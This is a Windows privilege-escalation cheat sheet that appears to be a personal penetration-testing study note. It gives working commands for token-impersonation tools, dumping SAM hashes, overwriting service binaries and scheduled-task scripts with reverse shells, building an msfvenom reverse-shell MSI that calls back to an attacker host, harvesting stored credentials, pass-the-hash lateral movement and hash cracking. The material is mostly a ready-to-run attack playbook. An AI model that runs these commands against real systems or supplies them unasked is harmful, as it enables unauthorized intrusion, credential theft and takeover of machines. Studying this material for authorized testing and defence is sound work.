## Windows Priv Esc — Order of Operations

Same instinct as [[Linux_Priv_Esc]]: check the cheap wins first, kernel exploits last. Work this order.

1. `whoami /priv` — token privileges ← **always first**
2. Services — writable binaries, unquoted paths, weak DACLs
3. Scheduled Tasks — writable script running as SYSTEM
4. Credential hunting — stored creds, PowerShell history, unattend files
5. Registry — AlwaysInstallElevated, AutoLogon, AutoRuns
6. Credential reuse / Pass-the-Hash — move with what you found
7. Kernel exploits (last resort)

> **Run [[winPEAS]] first** to surface most of these automatically, then confirm each finding manually with the commands below. winPEAS finds the path; you have to understand and execute it.

---

## 1. Token Privileges

> **In the event of:** You've landed a shell — the very first thing to check is what privileges your token holds, because several Windows privileges are a direct, exploit-free path to SYSTEM. This is the Windows equivalent of `sudo -l`: run it before anything else.

```cmd
whoami /priv
```
→ Lists the privileges on your current token and whether each is **Enabled**. A privilege only matters if it's present — cross-reference every enabled one against the table below.

### Exploitable privileges — the ones that lead to SYSTEM

| Privilege                       | What it grants                      | How to abuse                                                                                         |
| ------------------------------- | ----------------------------------- | ---------------------------------------------------------------------------------------------------- |
| `SeImpersonatePrivilege`        | Impersonate a client's token        | **PrintSpoofer / GodPotato / Potato** family → SYSTEM. Most common on service accounts (IIS, MSSQL). |
| `SeAssignPrimaryTokenPrivilege` | Assign a primary token to a process | Same Potato-family abuse as SeImpersonate                                                            |
| `SeBackupPrivilege`             | Read **any** file, bypassing DACLs  | Copy the SAM + SYSTEM hives → dump local hashes offline                                              |
| `SeRestorePrivilege`            | Write **any** file, bypassing DACLs | Overwrite a SYSTEM-run binary/DLL, or modify service configs                                         |
| `SeTakeOwnershipPrivilege`      | Take ownership of any object        | Own a SYSTEM file, grant yourself full control, replace it                                           |
| `SeDebugPrivilege`              | Debug any process                   | Dump LSASS memory (Mimikatz / procdump) → creds & hashes                                             |
| `SeLoadDriverPrivilege`         | Load a kernel driver                | Load a vulnerable/malicious driver → kernel code exec                                                |
| `SeManageVolumePrivilege`       | Full volume access                  | Can be chained to gain write access to protected files                                               |
|                                 |                                     |                                                                                                      |

> **These are the highest-value findings on a Windows box.** If `whoami /priv` shows any of them Enabled, that's usually your path — you rarely need to go further down the list.

> **Reference — the "GTFOBins" for Windows privileges** (look up any privilege → how to abuse it):
> - **Priv2Admin** — `https://github.com/gtworek/Priv2Admin`
> - **HackTricks** — `https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation` → *Abusing Tokens*
> - **Google term** for the `SeImpersonate` / `SeAssignPrimaryToken` class: search **"token impersonation"** (leads to the Potato family).
> - **Always confirm OS version first** (`ver` / `systeminfo`) — it decides *which* Potato works (2008/2012 → JuicyPotato/RoguePotato; 2016+ / Win10+ → PrintSpoofer/GodPotato).

### SeImpersonate → SYSTEM (most common)

**(How you notice it):** `whoami /priv` shows `SeImpersonatePrivilege  Enabled`, or winPEAS flags it. Extremely common on service accounts — `iis apppool\*`, `mssql`, `NETWORK SERVICE`, `LOCAL SERVICE`.

**Meaning:** you can impersonate the token of a privileged client that connects to you — including SYSTEM.

```cmd
systeminfo
```
→ Confirm OS version first — it decides which tool works.

**Pick the tool by OS:**
- Modern Windows 10/11 / Server 2016+ → **PrintSpoofer** or **GodPotato**
- Older (2008/2012, or where those fail) → **JuicyPotato** / **RoguePotato** variants

**Transfer the binary** (see [[File_Transfer]] — certutil / SMB / UNC), then:

```cmd
PrintSpoofer.exe -i -c cmd
```
→ `-i` interact with the new process, `-c cmd` runs cmd as SYSTEM. Confirm with `whoami` → `nt authority\system`.

```cmd
GodPotato.exe -cmd "cmd /c whoami"
```
→ GodPotato alternative when PrintSpoofer's named-pipe trick is blocked.

**Why it works:** these privileges let you accept a connection from a SYSTEM process and impersonate its token. The tool forces a SYSTEM component (print spooler, DCOM) to authenticate to a pipe you control, then hands you its token — no exploit against the kernel, just abuse of a legitimate privilege.

### SeBackup / SeRestore → dump the SAM

**(How you notice it):** `whoami /priv` shows `SeBackupPrivilege Enabled` (common for the **Backup Operators** group).

```cmd
reg save HKLM\SAM C:\Temp\SAM
reg save HKLM\SYSTEM C:\Temp\SYSTEM
```
→ `SeBackupPrivilege` lets you read protected registry hives. Exfil both files to Kali, then:

```bash
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```
→ Extracts local NTLM hashes offline. Crack them or Pass-the-Hash (section 6). See [[Impacket]].

---

## 2. Services

> **In the event of:** No token privilege win — services are the next-most-common Windows privesc. A service running as SYSTEM whose configuration you can influence lets you run your own code as SYSTEM. Three flavors: writable binary, unquoted path, weak DACL.

### 2a. Writable service binary

```cmd
sc qc <service_name>
```
→ Shows the `BINARY_PATH_NAME` and `SERVICE_START_NAME` (the run-as account). A service running as `LocalSystem` is the target. (Service name likely obtained from `sc query` in [[Windows_Common_Commands]], or flagged by [[winPEAS]].)

```cmd
icacls "C:\Path\to\service.exe"
```
→ Check whether **you** (or a group you're in) can write the binary. Look for `(F)`, `(M)`, or `(W)`:

| Right | What you can do                                              |
| ----- | ------------------------------------------------------------ |
| `(W)` | Overwrite the file's contents — enough to replace the binary |
| `(M)` | Read/write/execute/delete                                    |
| `(F)` | Everything, including permissions and ownership              |

**Replace the binary and restart:**
```cmd
copy /y revshell.exe "C:\Path\to\service.exe"
sc stop <service>
sc start <service>
```
→ On restart the service launches your payload **as its run-as account (SYSTEM)**. Start your listener first. Use `copy /y` to force-overwrite.

**Why it works:** a service just runs whatever binary its config points at, under its configured account. Control the binary = control what runs as SYSTEM. Same logic as a writable root cron script on Linux.

### 2b. Unquoted service path

```cmd
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
```
→ Finds auto-start services whose `pathname` is **not** wrapped in quotes and lives outside `C:\Windows`. Example: `C:\Program Files\My App\service.exe`.

**How it's abused:** Windows parses an unquoted path left-to-right on spaces, trying each candidate:
```
C:\Program.exe
C:\Program Files\My.exe
C:\Program Files\My App\service.exe
```
If you can write to `C:\` or `C:\Program Files\`, drop `Program.exe` (or `My.exe`) there and it runs **before** the real binary — as the service account. Check writability with `icacls` on each parent folder, then restart the service.

### 2c. Weak service DACL (reconfigure it)

```cmd
sc sdshow <service_name>
```
→ Dumps the service's security descriptor. Even without writing the binary, if your user has `SERVICE_CHANGE_CONFIG` you can point the service at your own binary:

```cmd
sc config <service_name> binpath= "C:\Users\Public\revshell.exe"
sc stop <service> && sc start <service>
```
→ Note the **space after `binpath=`** — it's required. `accesschk.exe -uwcqv <user> <service>` (Sysinternals) is the cleaner way to spot which services your user can reconfigure.

---

## 3. Scheduled Tasks

> **In the event of:** Services come up empty — a scheduled task running as SYSTEM that calls a script you can write to is a scheduled root shell, the Windows analog of a writable root cron job.

```cmd
schtasks /query /fo LIST /v
```
→ Verbose list of every task: `Run As User`, `Task To Run`, and the schedule. Hunt for a task where **Run As User = SYSTEM** and the command points at a script/binary you can modify.

```cmd
icacls "C:\Path\to\task_script.bat"
```
→ Confirm you can write the script the task runs.

**Overwrite it with your payload:**
```cmd
echo C:\Users\Public\revshell.exe > "C:\Path\to\task_script.bat"
```
→ Use `>` (overwrite) not `>>` so a broken original line can't stop your payload from running.

```cmd
schtasks /run /tn "<TaskName>"
```
→ Force the task to run now (if permitted) instead of waiting for its trigger. Shell pops as SYSTEM.

---

## 4. Credential Hunting

> **In the event of:** No misconfig path — a found password often lets you `runas` or WinRM/RDP to a higher-privileged account, skipping exploitation entirely. Windows creds hide in different places than Linux.

```cmd
type %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```
→ PowerShell command history — the Windows `.bash_history`. Admins paste passwords into commands here constantly. Check every readable profile.

```cmd
cmdkey /list
```
→ Saved credentials in Credential Manager. Even if you can't read the password, `runas /savecred /user:<user> cmd.exe` uses it.

```cmd
type C:\Windows\Panther\Unattend.xml
type C:\Windows\System32\Sysprep\unattend.xml
```
→ Install answer files — often hold a base64-encoded local admin password. See [[Windows_Common_Commands]] (Loot Hunting) for the full list of file locations and search one-liners.

```cmd
findstr /si password *.xml *.ini *.config *.txt
```
→ Recursive keyword search inside files. Run from `C:\` or a user profile.

---

## 5. Registry Privesc

> **In the event of:** Cred hunting is dry — two registry misconfigs are reliable, cheap wins.

### AlwaysInstallElevated

```cmd
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
→ If **both** return `0x1`, any `.msi` you run installs **as SYSTEM**. Build a malicious MSI on Kali:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI_IP> LPORT=<PORT> -f msi -o evil.msi
```
```cmd
msiexec /quiet /qn /i C:\Users\Public\evil.msi
```
→ Transfer, run it, catch your SYSTEM shell. See [[Msfvenom]].

### AutoLogon credentials

```cmd
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```
→ `DefaultUserName` / `DefaultPassword` stored in **plaintext**. Verify the username before assuming it (see [[winPEAS]] gotcha) then reuse it.

---

## 6. Credential Reuse / Pass-the-Hash

> **In the event of:** You recovered an NTLM hash or plaintext password — decide whether to crack it or use it as-is.

### Option 1 — Pass-the-Hash (no cracking)

Use when you want **fast lateral movement** and don't need the plaintext. You authenticate with the hash itself; no password needed (works while NTLM auth is enabled).

Outcomes: SMB access, command execution, lateral movement, sometimes admin.

```bash
netexec smb <IP> -u <user> -H <NTLM_HASH>
impacket-psexec <user>@<IP> -hashes :<NTLM_HASH>
```
→ See [[NetExec]] (preferred) · [[CrackMapExec]] · [[Impacket]].

### Option 2 — Crack the hash (get plaintext)

Use when you want RDP/interactive login, persistence, or to reuse the password across many services.

```bash
hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt
```
→ `-m 1000` = NTLM. Recovered password may work for the same user elsewhere, higher-priv accounts, or domain logins. See [[Hashcat]] · [[JohntheRipper]].

---

## 7. Kernel Exploits (LAST RESORT)

> **In the event of:** Everything else failed and the box is old/unpatched. Version-specific, noisy, and can crash the machine — treat exactly like Linux kernel exploits: last on the list.

```cmd
systeminfo
```
→ Grab the OS build and the **installed hotfixes** (`KB` numbers). A missing KB is what makes a kernel exploit apply. Feed `systeminfo` output to **Windows-Exploit-Suggester** or **Watson** to map build+hotfixes to known CVEs.

Then: match the exploit to the exact build carefully → transfer → execute → hope it doesn't bluescreen.

---

## Quick Checklist After Shell

Run this block right after landing a Windows shell — covers the most common privesc paths in one pass.

```cmd
whoami /priv
whoami /groups
systeminfo
net user
net localgroup administrators
cmdkey /list
type %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
schtasks /query /fo LIST /v | findstr /i "SYSTEM Task"
netstat -ano | findstr LISTENING
```

→ Then run [[winPEAS]] for the automated sweep and cross-reference its red findings against sections 1–5.

---

## Related Notes

- [[Windows_Common_Commands]]
- [[winPEAS]]
- [[File_Transfer]]
- [[Active_Directory_Attacks]]
- [[Linux_Priv_Esc]]
